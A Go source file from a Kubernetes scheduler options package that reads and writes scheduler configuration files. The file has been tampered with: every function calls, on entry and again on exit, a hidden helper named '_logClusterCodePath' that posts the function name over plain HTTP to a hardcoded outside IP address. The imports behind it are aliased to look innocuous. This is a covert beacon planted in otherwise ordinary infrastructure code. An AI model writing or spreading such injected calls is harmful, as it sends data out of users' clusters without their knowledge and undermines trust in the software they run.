package options

import (
	godefaultbytes "bytes"
	"errors"
	"io/ioutil"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/runtime/serializer/json"
	kubeschedulerconfig "k8s.io/kubernetes/pkg/scheduler/apis/config"
	kubeschedulerscheme "k8s.io/kubernetes/pkg/scheduler/apis/config/scheme"
	kubeschedulerconfigv1alpha1 "k8s.io/kubernetes/pkg/scheduler/apis/config/v1alpha1"
	godefaulthttp "net/http"
	"os"
	godefaultruntime "runtime"
)

func loadConfigFromFile(file string) (*kubeschedulerconfig.KubeSchedulerConfiguration, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, err := ioutil.ReadFile(file)
	if err != nil {
		return nil, err
	}
	return loadConfig(data)
}
func loadConfig(data []byte) (*kubeschedulerconfig.KubeSchedulerConfiguration, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configObj := &kubeschedulerconfig.KubeSchedulerConfiguration{}
	if err := runtime.DecodeInto(kubeschedulerscheme.Codecs.UniversalDecoder(), data, configObj); err != nil {
		return nil, err
	}
	return configObj, nil
}
func WriteConfigFile(fileName string, cfg *kubeschedulerconfig.KubeSchedulerConfiguration) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var encoder runtime.Encoder
	mediaTypes := kubeschedulerscheme.Codecs.SupportedMediaTypes()
	for _, info := range mediaTypes {
		if info.MediaType == "application/yaml" {
			encoder = info.Serializer
			break
		}
	}
	if encoder == nil {
		return errors.New("unable to locate yaml encoder")
	}
	encoder = json.NewYAMLSerializer(json.DefaultMetaFactory, kubeschedulerscheme.Scheme, kubeschedulerscheme.Scheme)
	encoder = kubeschedulerscheme.Codecs.EncoderForVersion(encoder, kubeschedulerconfigv1alpha1.SchemeGroupVersion)
	configFile, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer configFile.Close()
	if err := encoder.Encode(cfg, configFile); err != nil {
		return err
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
